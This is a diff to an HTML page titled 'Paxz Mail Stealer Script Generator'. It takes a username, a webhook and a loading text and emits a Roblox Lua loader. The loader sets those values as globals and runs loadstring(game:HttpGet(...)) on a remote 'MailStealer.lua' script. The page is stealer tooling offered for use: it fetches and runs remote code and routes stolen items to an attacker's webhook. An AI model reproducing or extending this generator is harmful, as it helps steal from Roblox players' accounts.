@@ -1,80 +1,42 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>GitHub HTML-pagina</title>
+    <meta charset="UTF-8">
+    <title>Paxz Mail Stealer Script Generator</title>
     <style>
       body {
-        background-image: url("https://4kwallpapers.com/images/wallpapers/galaxy-milky-way-stars-deep-space-colorful-astronomy-nebula-2880x1800-5366.jpg");
+        background-image: url('https://4kwallpapers.com/images/wallpapers/galaxy-milky-way-stars-deep-space-colorful-astronomy-nebula-2880x1800-5366.jpg');
         background-size: cover;
-      }
-      input[type="text"] {
-        padding: 10px;
-        margin: 10px;
-        width: 80%;
-      }
-      #output {
-        padding: 10px;
-        margin: 10px;
-        width: 80%;
-        background-color: #fff;
-      }
-      #submit {
-        padding: 10px;
-        margin: 10px;
-        width: 80%;
-        background-color: #4CAF50;
-        color: #fff;
-        border: none;
-        border-radius: 4px;
-        cursor: pointer;
       }
     </style>
   </head>
   <body>
-    <h1>GitHub HTML-pagina</h1>
+    <h1>Paxz Mail Stealer Script Generator</h1>
     <form>
-      <label for="username">Username:</label>
+      <label for="username">Username:</label><br>
       <input type="text" id="username" name="username"><br>
-
-      <label for="webhook">Webhook:</label>
+      <label for="webhook">Webhook:</label><br>
       <input type="text" id="webhook" name="webhook"><br>
-
-      <label for="loadingtext">LoadingText:</label>
-      <input type="text" id="loadingtext" name="loadingtext"><br>
-
-      <label for="script">Script:</label>
-      <input type="text" id="script" name="script" value='&#95;G.UserName = ""<br>
-&#95;G.Webhook = ""<br>
-&#95;G.loadingScreenText = ""<br><br>
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua"))()'><br>
-
-      <input type="button" value="Copy to Clipboard" onclick="copyScript()">
+      <label for="loadingText">LoadingText:</label><br>
+      <input type="text" id="loadingText" name="loadingText"><br>
+      <label for="output">Script Output:</label><br>
+      <textarea id="output" rows="10" cols="50"></textarea><br>
+      <input type="button" value="Generate Script" onclick="generateScript();">
     </form>
-    
+
     <script>
-      function copyScript() {
-        const script = document.getElementById("script").value
-          .replace("&#95;", "_")
-          .replace(/<br>/g, "\n");
-        navigator.clipboard.writeText(script);
+      function generateScript() {
+        var username = document.getElementById("username").value;
+        var webhook = document.getElementById("webhook").value;
+        var loadingText = document.getElementById("loadingText").value;
+
+        var script = '_G.UserName = "' + username + '"\n';
+        script += '_G.Webhook = "' + webhook + '"\n';
+        script += '_G.loadingScreenText = "' + loadingText + '"\n\n';
+        script += 'loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua"))()';
+
+        document.getElementById("output").value = script;
       }
-      
-      const username = document.getElementById("username");
-      const webhook = document.getElementById("webhook");
-      const loadingtext = document.getElementById("loadingtext");
-      
-      function updateScript() {
-        const script = document.getElementById("script");
-        const newScript = script.value
-          .replace(/"_G.UserName = .+"/, `"_G.UserName = \\"${username.value}\\";"`)
-          .replace(/"_G.Webhook = .+"/, `"_G.Webhook = \\"${webhook.value}\\";"`)
-          .replace(/"_G.loadingScreenText = .+"/, `"_G.loadingScreenText = \\"${loadingtext.value}\\";"`);
-        script.value = newScript;
-      }
-      
-      username.addEventListener("input", updateScript);
-      webhook.addEventListener("input", updateScript);
-      loadingtext.addEventListener("input", updateScript);
     </script>
   </body>
 </html>
